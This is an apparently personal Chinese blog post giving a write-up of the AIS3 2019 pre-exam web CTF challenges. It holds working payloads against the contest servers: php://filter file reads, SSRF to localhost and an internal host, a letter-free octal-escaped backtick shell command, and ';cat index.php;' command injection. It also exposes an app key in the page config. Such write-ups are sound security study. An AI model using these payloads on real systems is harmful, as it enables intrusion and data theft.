<!DOCTYPE html>
<html>
  
<head>
  <meta charset="utf-8">
  <meta name="author" content="oToToT" />
  
  
  <title>AIS3 2019 pre-exam write-up暨迷你心得 | oToToT Blog</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="write-up,AIS3,CTF," />
  

  
  <meta name="description" content="紀錄oToToT的各種瑣事">

  

  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async>
      MathJax.Hub.Config({
        TeX: { equationNumbers: { autoNumber: "AMS"  }  },
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          displayMath: [ ['$$','$$'], ["\\[","\\]"]  ],
          processEscapes: true 
        },
        'HTML-CSS': { scale: 90  },
         displayIndent: '2em'                                    
      });
    </script>
  

  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
    welcome: {"enable":false,"interval":30},
    start_time: "2019-06-15",
    passwords: ["c967350c7e652c6305ef7c7dba4feb6b1106bba85fbef5d08d1897ef42fd5ffd", ],
    is_post: true,
    lock: false,
    author: "oToToT",
    share: {"twitter":true,"facebook":true,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  
<script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>


  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  
<link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">


  
<meta name="generator" content="Hexo 5.4.0"></head>

  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">oToToT</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | 存在與不存在，無論事物的想法</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首頁</a>
      
        <a href="/archives/" target="_self">文章列表</a>
      
        <a href="/tags/" target="_self">標籤</a>
      
        <a href="/categories/" target="_self">分類</a>
      
        <a href="/about/" target="_self">關於</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/oToToT/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首頁
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            文章列表
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/tags/" target="_self">
            標籤
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/categories/" target="_self">
            分類
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/about/" target="_self">
            關於
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2019-06-19
    </span>
    
      <span>
        | <a href="/categories/write-up/"><i class="fa fa-bookmark"></i>write-up</a>
      </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    AIS3 2019 pre-exam write-up暨迷你心得
  </h1>
  
  <article class="passage-article">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先附個Terrynini在封榜後截的記分板(有點長)</p>
<p><img src="scoreboard.png" alt="AIS3 pre-exam scoreboard"></p>
<p>嗯….挺長的</p>
<p>算了算這可能算是我第二次打超過一天的CTF比賽吧，雖然第一次也是去年的AIS3 pre-exam</p>
<p>總之這次應該是一堆大佬都沒來比了，加上運氣好像蠻好的，瞎摸一堆就看到flag，莫名其妙的拿了個第4名</p>
<p>不過從頭到尾只解了一題pwn的bof，連orw都不會解，所以跟上面的人差距著實不小，不過最近也在慢慢多學一點pwn相關的知識了，希望去AIS3的時候不要又跟去年一樣無力</p>
<p>總之來寫寫一些我賽到的部分吧</p>
<p>阿，對了，先附個官解連結：</p>
<ul>
<li>Pwn<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/yuawn/ais3-2019-pre-exam">https://github.com/yuawn/ais3-2019-pre-exam</a></li>
</ul>
</li>
<li>Reverse<ul>
<li><a target="_blank" rel="noopener" href="http://blog.terrynini.tw/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/">http://blog.terrynini.tw/tw/2019-AIS3-前測官方解/</a></li>
</ul>
</li>
<li>Web<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/w181496/AIS3-PreExam-2019">https://github.com/w181496/AIS3-PreExam-2019</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/djosix/AIS3-2019-Pre-Exam">https://github.com/djosix/AIS3-2019-Pre-Exam</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.djosix.com/ais3-2019-pre-exam-%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95/">https://blog.djosix.com/ais3-2019-pre-exam-官方解法/</a></li>
</ul>
</li>
<li>Crypto<ul>
<li><a target="_blank" rel="noopener" href="https://maojui.me/">https://maojui.me/</a></li>
</ul>
</li>
</ul>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Simple-Window"><a href="#Simple-Window" class="headerlink" title="Simple Window"></a>Simple Window</h3><p>這題我覺得是Web題裡面最難的www(?)</p>
<p>我從頭到尾不知道發生什麼事，也沒有使用burpsuite之類的習慣</p>
<p>搞了很久之後還是不知道為什麼/flag拿不到東西</p>
<p>最後就直接在瀏覽器裡編輯HTML，加入一個from submit之後就拿到flag了</p>
<p>看到官解才知道有什麼service worker之類的東東QQ</p>
<h3 id="Hidden"><a href="#Hidden" class="headerlink" title="Hidden"></a>Hidden</h3><p>這題沒存到資料，所以是參考官方解寫的，不過我的解也一樣就是了</p>
<p>總之開啟來翻了翻code看到有個js，戳開搜尋了一下flag發現有個<code>&#123;&quot;./flag.js&quot;:&quot;nHHx&quot;&#125;</code></p>
<p>繼續搜尋個nHHx看到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;nHHx&quot;</span>:[<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>,<span class="built_in">module</span>,<span class="built_in">exports</span></span>) </span>&#123;</span><br><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="built_in">Object</span>.defineProperty(<span class="built_in">exports</span>,<span class="string">&quot;__esModule&quot;</span>,&#123;<span class="attr">value</span>:!<span class="number">0</span>&#125;),<span class="built_in">exports</span>.default=<span class="keyword">void</span> <span class="number">0</span>;<span class="keyword">var</span> r=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> r=<span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>),t=r.shift();<span class="keyword">return</span> r.reverse().map(<span class="function"><span class="keyword">function</span>(<span class="params">r,e</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(r-t-<span class="number">25</span>-e)&#125;).join(<span class="string">&quot;&quot;</span>)&#125;(<span class="number">12</span>,<span class="number">144</span>,<span class="number">165</span>,<span class="number">95</span>,<span class="number">167</span>,<span class="number">140</span>,<span class="number">95</span>,<span class="number">157</span>,<span class="number">94</span>,<span class="number">164</span>,<span class="number">91</span>,<span class="number">122</span>,<span class="number">111</span>,<span class="number">102</span>)+<span class="number">4.</span>.toString(<span class="number">36</span>).toLowerCase()+<span class="number">21.</span>.toString(<span class="number">36</span>).toLowerCase().split(<span class="string">&quot;&quot;</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">r</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(r.charCodeAt()+-<span class="number">13</span>)&#125;).join(<span class="string">&quot;&quot;</span>)+<span class="number">1234274547001.</span>.toString(<span class="number">36</span>).toLowerCase()+<span class="number">21.</span>.toString(<span class="number">36</span>).toLowerCase().split(<span class="string">&quot;&quot;</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">r</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(r.charCodeAt()+-<span class="number">13</span>)&#125;).join(<span class="string">&quot;&quot;</span>)+<span class="number">579.</span>.toString(<span class="number">36</span>).toLowerCase()+<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> r=<span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>),t=r.shift();<span class="keyword">return</span> r.reverse().map(<span class="function"><span class="keyword">function</span>(<span class="params">r,e</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(r-t-<span class="number">44</span>-e)&#125;).join(<span class="string">&quot;&quot;</span>)&#125;(<span class="number">18</span>,<span class="number">190</span>,<span class="number">127</span>,<span class="number">170</span>,<span class="number">113</span>)&#125;;<span class="built_in">exports</span>.default=r;</span><br><span class="line">&#125;,&#123;&#125;]</span><br></pre></td></tr></table></figure>

<p>抓出來執行一下後就拿到Flag <code>AIS3&#123;4r3_y0u_4_fr0n73nd_g33k?&#125;</code></p>
<h3 id="d1v1n6"><a href="#d1v1n6" class="headerlink" title="d1v1n6"></a>d1v1n6</h3><p>點了hint看到<code>http://pre-exam-web.ais3.org:10103/?path=hint.txt</code>，於是想說可能是某種file_get_contents之類的東西</p>
<p>直接打了<code>http://pre-exam-web.ais3.org:10103/?path=index.php</code>，發現不能有flag這個關鍵字</p>
<p>那就改用php filter來撈資料，所以改成連<code>http://pre-exam-web.ais3.org:10103/?path=php://filter/read=string.rot13/resource=index.php</code>就可以拿到source code了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// show path of the flag</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$_ENV</span>[<span class="string">&#x27;FLAG_HINT&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$path</span> = trim(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/https?:\/\/([^s\/]+)/i&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$g</span>)) &#123;</span><br><span class="line">            <span class="comment">// resolve ip address</span></span><br><span class="line">            <span class="variable">$ip</span> = gethostbyname(<span class="variable">$g</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// no local request</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span> || <span class="variable">$ip</span> == <span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Do not request to localhost!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// no flag in path</span></span><br><span class="line">        <span class="variable">$path</span> = preg_replace(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$content</span> = @file_get_contents(<span class="variable">$path</span>, <span class="literal">FALSE</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// no flag in content</span></span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Detected &quot;flag&quot; in content. Not showing!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;No content or failed to get content.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;d1v1n6&lt;/h2&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;?path=hint.txt&quot;</span>&gt;Hint&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看完source code發現只要讓他自己去連index.php就可以拿到flag了</p>
<p>原本打算用<code>http://pre-exam-web.ais3.org:10103/?path=http://localhost/index.php</code>拿到資料，但再次的發現裡面有flag字眼</p>
<p>於是再用php filter把資料撈出來<br><code>http://pre-exam-web.ais3.org:10103/?path=php://filter/read=convert.base64-encode/resource=http://localhost/index.php</code></p>
<p>得知flag擺在<code>http://pre-exam-web.ais3.org:10103/FLAG_14d65189669f05d206764c9de441474d.txt</code></p>
<p>進去就拿到flag: <code>AIS3&#123;600d_j0b_bu7_7h15_15_n07_7h3_3nd&#125;</code></p>
<p>不過拿到flag後其實一直很好奇那個regular expression有什麼用，因為看到的時候還以為要某種dns第一次的時候拿到的跟第二次拿到的不一樣的技巧</p>
<p>看了官解才發現原來只是他code寫爛了XDD</p>
<h3 id="3v4l"><a href="#3v4l" class="headerlink" title="3v4l"></a>3v4l</h3><p>進去之後看到一個php source code</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ob_start();</span><br><span class="line">(</span><br><span class="line"><span class="variable">$_</span></span><br><span class="line">=<span class="string">&quot;TG</span></span><br><span class="line"><span class="string">9jYXR</span></span><br><span class="line"><span class="string">pb246I</span></span><br><span class="line"><span class="string">Gh0dHBz</span></span><br><span class="line"><span class="string">Oi8veW91</span></span><br><span class="line"><span class="string">dHUuYmUvZ</span></span><br><span class="line"><span class="string">FF3NHc5V2d</span></span><br><span class="line"><span class="string">YY1EK&quot;</span>)  &amp;&amp;</span><br><span class="line">HiGhlIght_FiLE</span><br><span class="line">( <span class="keyword">__FILE__</span> ) &amp;&amp; </span><br><span class="line">pReg_MATcH(<span class="string">&quot;/[\x61-\x7a</span></span><br><span class="line"><span class="string">\x41-\x5a]/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;#&#x27;</span>])</span><br><span class="line">!== <span class="number">0</span> ? <span class="keyword">die</span>(header(base64_decode</span><br><span class="line">(<span class="variable">$_</span>))) : (strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;#&#x27;</span>]) &gt; <span class="number">18</span></span><br><span class="line">? <span class="keyword">dIe</span>(header(baSE64_DecOde(<span class="variable">$_</span>)) )</span><br><span class="line">: <span class="keyword">eval</span>( <span class="string">&quot;\x65cho &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;#&#x27;</span>]  ) ); </span><br><span class="line"><span class="keyword">dIE</span>(&lt;&lt;&lt;SEACAT007SEACAT007SEACAT007SEACAT007</span><br><span class="line">                _ ___                /^^\ /^\  /^^\_</span><br><span class="line">    _          _@)@) \            ,,/ <span class="string">&#x27;` ~ `&#x27;</span>~~ <span class="string">&#x27;, `\.</span></span><br><span class="line"><span class="string">  _/o\_ _ _ _/~`.`...&#x27;</span>~\        ./~~..,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#x27;</span>,.,<span class="string">&#x27; &#x27;</span>  ~:</span><br><span class="line"> / `,<span class="string">&#x27;.~,~.~  .   , . , ~|,   ,/ .,&#x27;</span> , ,. .. ,,.   `,  ~\_</span><br><span class="line">( <span class="string">&#x27; _&#x27;</span> _ <span class="string">&#x27;_` _  &#x27;</span>  .    , `\_/ .<span class="string">&#x27; ..&#x27;</span> <span class="string">&#x27;  `  `   `..  `,   \_</span></span><br><span class="line"><span class="string"> ~V~ V~ V~ V~ ~\ `   &#x27;</span> .  <span class="string">&#x27;    , &#x27;</span> .,.,<span class="string">&#x27;&#x27;</span>`.,.<span class="string">&#x27;&#x27;</span>`.,.``. <span class="string">&#x27;,   \_</span></span><br><span class="line"><span class="string">  _/\ /\ /\ /\_/, . &#x27;</span> ,   `_/~\_ .<span class="string">&#x27; .,. ,, , _/~\_ `. `. &#x27;</span>.,  \_</span><br><span class="line"> &lt; ~ ~ <span class="string">&#x27;~`&#x27;</span>~<span class="string">&#x27;`, .,  .   `_: ::: \_ &#x27;</span>      `_/ ::: \_ `.,<span class="string">&#x27; . &#x27;</span>,  \_</span><br><span class="line">  \ <span class="string">&#x27; `_  &#x27;</span>`_    _    <span class="string">&#x27;,/ _::_::_ \ _    _/ _::_::_ \   `.,&#x27;</span>.,`., \-,-,-,_,_,</span><br><span class="line">   `<span class="string">&#x27;~~ `&#x27;</span>~~ `<span class="string">&#x27;~~ `&#x27;</span>~~  \(_)(_)(_)/  `~~<span class="string">&#x27; \(_)(_)(_)/ ~&#x27;</span>`\_.._,._,<span class="string">&#x27;_;_;_;_;_;</span></span><br><span class="line"><span class="string">SEACAT007SEACAT007SEACAT007SEACAT007</span></span><br><span class="line"><span class="string">) &amp;&amp; sYsTEm( &quot;seacat flag007&quot; );</span></span><br><span class="line"><span class="string">ob_end_flush();</span></span><br></pre></td></tr></table></figure>

<p>稍微整理一下可以看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ob_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$_</span>=<span class="string">&quot;TG9jYXRpb246IGh0dHBzOi8veW91dHUuYmUvZFF3NHc5V2dYY1EK&quot;</span>) &amp;&amp;</span><br><span class="line">    highlight_file( <span class="keyword">__FILE__</span> ) &amp;&amp; </span><br><span class="line">    preg_match( <span class="string">&quot;/[a-zA-Z]/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;#&#x27;</span>] ) !== <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>( header( base64_decode( <span class="variable">$_</span> ) ) );</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>( strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;#&#x27;</span>]) &gt; <span class="number">18</span> ) &#123;</span><br><span class="line">    <span class="keyword">die</span>( header( base64_decode( <span class="variable">$_</span> ) ) );</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;echo &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;#&#x27;</span>] ); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">dIE</span>(&lt;&lt;&lt;SEACAT007SEACAT007SEACAT007SEACAT007</span><br><span class="line">                _ ___                /^^\ /^\  /^^\_</span><br><span class="line">    _          _@)@) \            ,,/ <span class="string">&#x27;` ~ `&#x27;</span>~~ <span class="string">&#x27;, `\.</span></span><br><span class="line"><span class="string">  _/o\_ _ _ _/~`.`...&#x27;</span>~\        ./~~..,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#x27;</span>,.,<span class="string">&#x27; &#x27;</span>  ~:</span><br><span class="line"> / `,<span class="string">&#x27;.~,~.~  .   , . , ~|,   ,/ .,&#x27;</span> , ,. .. ,,.   `,  ~\_</span><br><span class="line">( <span class="string">&#x27; _&#x27;</span> _ <span class="string">&#x27;_` _  &#x27;</span>  .    , `\_/ .<span class="string">&#x27; ..&#x27;</span> <span class="string">&#x27;  `  `   `..  `,   \_</span></span><br><span class="line"><span class="string"> ~V~ V~ V~ V~ ~\ `   &#x27;</span> .  <span class="string">&#x27;    , &#x27;</span> .,.,<span class="string">&#x27;&#x27;</span>`.,.<span class="string">&#x27;&#x27;</span>`.,.``. <span class="string">&#x27;,   \_</span></span><br><span class="line"><span class="string">  _/\ /\ /\ /\_/, . &#x27;</span> ,   `_/~\_ .<span class="string">&#x27; .,. ,, , _/~\_ `. `. &#x27;</span>.,  \_</span><br><span class="line"> &lt; ~ ~ <span class="string">&#x27;~`&#x27;</span>~<span class="string">&#x27;`, .,  .   `_: ::: \_ &#x27;</span>      `_/ ::: \_ `.,<span class="string">&#x27; . &#x27;</span>,  \_</span><br><span class="line">  \ <span class="string">&#x27; `_  &#x27;</span>`_    _    <span class="string">&#x27;,/ _::_::_ \ _    _/ _::_::_ \   `.,&#x27;</span>.,`., \-,-,-,_,_,</span><br><span class="line">   `<span class="string">&#x27;~~ `&#x27;</span>~~ `<span class="string">&#x27;~~ `&#x27;</span>~~  \(_)(_)(_)/  `~~<span class="string">&#x27; \(_)(_)(_)/ ~&#x27;</span>`\_.._,._,<span class="string">&#x27;_;_;_;_;_;</span></span><br><span class="line"><span class="string">SEACAT007SEACAT007SEACAT007SEACAT007</span></span><br><span class="line"><span class="string">) &amp;&amp; system( &quot;seacat flag007&quot; );</span></span><br><span class="line"><span class="string">ob_end_flush();</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>瞄了兩下發現他會<code>eval(&quot;echo &quot;.$_GET[&#39;#&#39;])</code>，所以做法應該是想辦法是湊出一個長度&lt;18，不包含任何大小寫英文字母的payload塞在$_GET[‘#’]裡面</p>
<p>看到字串類的東西我第一個想到的是利用<code>`cmd`</code>，這樣就可以執行<code>system(&quot;cmd&quot;)</code>，但是因為不能有英文字母，所以我是想到用某種其他的編碼之類的來escape，查了查找到php可以用<code>\141</code>來表示<code>a</code>(141是<code>a</code>的8進位表示)</p>
<p>所以最後就構造了一個payload: <code>http://pre-exam-web.ais3.org:10105/?%23=`\143\141\164%20/*`;</code> 連進去就拿到flag了XD</p>
<p>不過看了官解才發現這其實是untended solution …</p>
<h3 id="d1v1n6-d33p3r"><a href="#d1v1n6-d33p3r" class="headerlink" title="d1v1n6 d33p3r"></a>d1v1n6 d33p3r</h3><p>前一題d1v1n6給的hint告訴我們</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                 ^&#96;.                     o</span><br><span class="line"> ^_              \  \                  o  o</span><br><span class="line"> \ \             &#123;   \                 o</span><br><span class="line"> &#123;  \           &#x2F;     &#96;~~~--__</span><br><span class="line"> &#123;   \___----~~&#39;              &#96;~~-_     ______          _____</span><br><span class="line">  \                         &#x2F;&#x2F;&#x2F; a  &#96;~._(_||___)________&#x2F;___</span><br><span class="line">  &#x2F; &#x2F;~~~~-, ,__.    ,      &#x2F;&#x2F;&#x2F;  __,,,,)      o  ______&#x2F;    \</span><br><span class="line">  \&#x2F;      \&#x2F;    &#96;~~~;   ,---~~-_&#96;~&#x3D; \ \------o-&#39;            \</span><br><span class="line">                   &#x2F;   &#x2F;            &#x2F; &#x2F;</span><br><span class="line">                  &#39;._.&#39;           _&#x2F;_&#x2F;</span><br><span class="line">                                  &#39;;|\</span><br><span class="line">Your flag:</span><br><span class="line">  AIS3&#123;600d_j0b_bu7_7h15_15_n07_7h3_3nd&#125;</span><br><span class="line"></span><br><span class="line">Hints for d1v1n6 d33p3r:</span><br><span class="line">- Find the other web server in the internal network.</span><br><span class="line">- Scanning is forbidden and not necessary.</span><br></pre></td></tr></table></figure>

<p>所以只好到處亂逛，逛了真的超級久逛到<code>/etc/hosts</code>的時候發現原來有另外一個網站<code>http://pre-exam-web.ais3.org:10103/?path=http://172.22.0.2/</code></p>
<p>原本以為這裡就結束了，於是順手檢視原始碼</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Directory Lister<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Let&#x27;s hack my stupid webpage for d1v1n6 d33p3r<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;dir&quot;</span> <span class="attr">value</span>=<span class="string">&quot;./&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;List!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>結果這才只是新的一題的開始，嘗試填了表單發現看起來很像他會執行<code>system(&#39;ls -al \&#39;&#39;.$_GET[&#39;dir&#39;].&#39;&#39;)</code>並且把資料輸出出來，嘗試構造了很久的payload，也不知道到底發生什麼事</p>
<p>總之最後透過<code>http://pre-exam-web.ais3.org:10103/?path=http://172.22.0.2/?dir=-F%2527;cat%2520index.php;%2527</code>成功leak出原始碼與flag</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Directory Lister<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Let&#x27;s hack my stupid webpage for d1v1n6 d33p3r<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span 